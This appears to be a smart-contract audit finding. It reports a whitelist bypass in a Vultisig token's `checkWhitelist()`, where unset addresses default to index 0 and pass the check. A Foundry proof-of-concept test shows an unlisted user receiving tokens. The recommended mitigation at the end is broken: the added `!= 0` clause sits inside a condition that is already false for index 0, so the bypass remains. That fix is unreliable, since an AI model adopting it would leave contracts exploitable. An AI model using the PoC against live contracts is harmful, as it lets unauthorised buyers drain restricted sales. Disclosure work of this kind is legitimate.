# Vulnerability details

## Impact
A non whitelisted user can bypass the `checkWhitelist()` allowing anyone to buy tokens from the pool.

This issue is derived from a missing check in `checkWhitelist` where we dont check that `_whitelistIndex[to] != 0` when checking if the `to` param is whitelisted.

The root of the issue is in the following if statement

```solidity
            if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
                revert NotWhitelisted();
            }
```


We can safely bypass `_allowedWhitelistIndex == 0` assuming it is set because it will not be zero if the vultisig is using a whitelist. We also bypass the second check of `_whitelistIndex[to] > _allowedWhitelistIndex` because solidity default's all unused mappings to 0, so in this case `_whitelistIndex[to]` will be equal to 0 which will bypass the check.

## Proof of Concept
```solidity
contract Base is Test {
    VultisigWhitelisted vultisig;
    Whitelist whitelist;

    // Mock addresses
    address public owner = address(100);
    address public pool = address(200);
    address public oracle = address(300);
    address public nonWhitelistedUser = address(400);

    function setUp() external {
      vm.startPrank(owner);
        whitelist = new Whitelist();
        vultisig = new VultisigWhitelisted();
        vultisig.setWhitelistContract(address(whitelist));

        // Configure the whitelist
        whitelist.setLocked(false);
        whitelist.setPool(pool);
        whitelist.setAllowedWhitelistIndex(1000);
        whitelist.setOracle(oracle);
        whitelist.setMaxAddressCap(1000);
        whitelist.setVultisig(address(vultisig));

        // Transfer from the owner to our mock pool
        vultisig.transfer(pool, 1000);
      vm.stopPrank();
  
    }
}


contract PoC is Base {
    function testNonWhitelistedUserCanBuyTokens() external {
        // Mock oracle returning 100 
        vm.mockCall(oracle, abi.encodeWithSignature('peek(uint256)', 1000), abi.encode(100));

        // In a real world scenario this would be the user buying tokens as the pool is transfering tokens to the user
        // Setting it up like this for simplicity
        vm.prank(pool);
        vultisig.transfer(nonWhitelistedUser, 1000);

        assertEq(vultisig.balanceOf(nonWhitelistedUser), 1000);
    }
}
```

## Recommended Mitigation Steps
The simplest mitigation without refactoring the whitelisting system would be to add an extra check to the below code

```solidity
            if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
                revert NotWhitelisted();
            }
```

We should add an extra check that `_whitelistIndex[to] != 0` so it can be refactored as such

```solidity
            if (_allowedWhitelistIndex == 0 || (_whitelistIndex[to] > _allowedWhitelistIndex && _whitelistIndex[to] != 0)) {
                revert NotWhitelisted();
            }
```
